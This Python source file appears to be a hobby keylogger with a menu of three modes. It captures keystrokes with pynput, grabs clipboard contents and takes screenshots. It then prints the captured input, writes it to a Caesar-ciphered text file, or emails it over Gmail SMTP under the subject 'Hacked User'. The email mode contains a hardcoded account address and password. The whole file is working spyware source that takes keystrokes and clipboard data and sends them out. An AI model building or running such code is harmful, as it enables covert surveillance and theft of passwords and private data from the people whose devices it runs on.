#this library allows us to control and monitor input devices such as mouse and 
#keyboard, here we import it it to monitor the keyboard for log presses
import pynput

#this allows keyboard access from pyinput library
from pynput.keyboard import Key, Listener

#allows fo GUI applications, it provides object oriented interface, will be used for screenshoting 
from tkinter import Tk

#allows python to control the mouse and keyboard with other applications. will be used for copy and pasting
import pyautogui

#this offers a variety of methods for expressing time in code.
import time 

#this module provides a number of methods and variables for manipulating different aspects of the python runtime enviroment
import sys


# a while true loop must be active in order to repeatedly run the program
while 1:
    
    print ("______________________________________________________")
    print ("""
    
    Which code should run ? 

    Code: 1 Output in console 
    Code: 2 Output as text file
    Code: 3 Output as Email
    Option 4 exit program

______________________________________________________
    """)
    
    # adds a "1" to the key list every time the user presses a key 
    answer = input("Which code should run ? ")
    print ("______________________________________________________") 
    if answer=="1":
        count = 0
        log = []

        def on_press(key):
            
            print(key, end= " ")
            print("logged")
            global log, count
            log.append(str(key))
            count = 1 + count
            
            if count > 10:
                count = 0

        # detects a release of a key that was pressed
        
        def on_release(key):
           
            if key==Key.esc:
                print (log) 
                return False 

        # awaits logtroke 
        with Listener(on_press = on_press, on_release = on_release) as listener:
            listener.join()
        # copy paste to clipboard

        r = Tk()
        result = r.selection_get(selection="CLIPBOARD")
        clipboard = []
        clipboard.append(result)
        print (clipboard)
        print(result)
        # screenshot using pyautogui library 

        myScreenshot = pyautogui.screenshot()
        # saves screen shot, must enter a correct file location 
        myScreenshot.save(r'C:\Users\YOURUSERNAME\Desktop\screenshot_1.png')
        # Must enter your username on your desktop directory to save screenshot
     
        
        

        # same code as above however, after taking a screen shot it save the file as txt file               
    elif answer=="2":
        
        count = 0
        log = []

        def on_press(key):
            
            print(key, end= " ")
            print("logged")
            global log, count
            log.append(str(key))
            count = 1 + count
            
            if count > 10:
                count = 0

        def email(log):
           
            message = ""
            for key in log:
                k = key.replace("'","")
                if key=="Key.space":
                    k = " " 
                elif key.find("Key")>0:
                    k = ""
                message = k + message 
            print(message)
        
        def on_release(key):
            
            if key==Key.esc: 
                print (log)
                return False

        
        with Listener(on_press = on_press, on_release = on_release) as listener:
            listener.join()

        r = Tk()
        result = r.selection_get(selection="CLIPBOARD")
        clipboard = []
        clipboard.append(result)
        print (clipboard)
        print(result)

    

        # Python program to convert a list to string
        
        # Function to convert
        def listToString(s):
        
            # initialize an empty string
            str1 = ""
        
            # traverse in the string
            for ele in s:
                str1 = ele + str1
        
            # return string
            return str1
            
            
        # Driver code	
        s = log
        print(listToString(s))

        with open("randomfile1.txt", "a") as o:
            o.write(listToString(s))
            o.write("//")
            o.write("Clipboard :  ")
            o.write(result)

    #A python program to illustrate Caesar Cipher Technique
        def encrypt(text,s):
            result = ""

            # traverse text
            for i in range(len(text)):
                char = text[i]

                # Encrypt uppercase characters
                if (char.isupper()):
                    result += chr((ord(char) + s-65) % 26 + 65)

                # Encrypt lowercase characters
                else:
                    result += chr((ord(char) + s - 97) % 26 + 97)

            return result

        #check the above function
        text = (listToString(s))
        s = 6
        print ("Shift : " + str(s))
        print ("Cipher: " + encrypt(text,s))



    # sends logtrokes as email 
    elif answer=="3":
        count = 0
        log = []

        def on_press(key):
            
            print(key, end= " ")
            print("logged")
            global log, count
            log.append(str(key))
            count = 1 + count 
            if count > 10:
                count = 0

        def email(log):
           
            message = ""
            for key in log:
                k = key.replace("'","")
                if key=="Key.space":
                    k = " " 
                elif key.find("Key")>0:
                    k = ""
                message = k + message
            print(message)
        
        def on_release(key):
            
            if key==Key.esc:
                print (log)
                return False

        
        with Listener(on_press = on_press, on_release = on_release) as listener:
            listener.join()


        
        # Python program to convert a list to string
        
        # Function to convert
        def listToString(s):
        
            # initialize an empty string
            str1 = ""
        
            # traverse in the string
            for ele in s:
                str1 = ele + str1
        
            # return string
            return str1
            
            
        # Driver code	
        s = log
        print(listToString(s))
        
        
        # using smtp protocol to send email
        import smtplib
        from email.mime.text import MIMEText

        smtp_ssl_host = 'smtp.gmail.com'
        smtp_ssl_port = 465
        username = 'rnaiem25@gmail.com'
        password = 'pythontest'

        def send_email():

            sender = 'rnaiem25@gmail.com'
            receiver = 'rnaiem25@gmail.com'

            # implicitly joined string
            msg_body = (listToString(s))

            message = MIMEText(msg_body, "plain")
            # treat message as dictionary
            message['subject'] = 'Hacked User'
            message['from']    = sender
            message['to']      = receiver

            # contact gmail server and send mail 
            try:
                server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
                server.login(username, password)
                server.sendmail(sender, receiver, message.as_string())
                server.quit()
                print("Successfully sent email")
            except:
                print("Error: unable to send email")

        # ________________

        send_email()

        
    elif answer=="4":
       
        time.sleep(3)
        print("Goodbye...")
        print ("______________________________________________________")
        sys.exit()
    
    elif answer != "":
        
        print("Not Valid Choice Try again...")
        print ("______________________________________________________")
        time.sleep(3)
    
    else:
        print ("try again...")

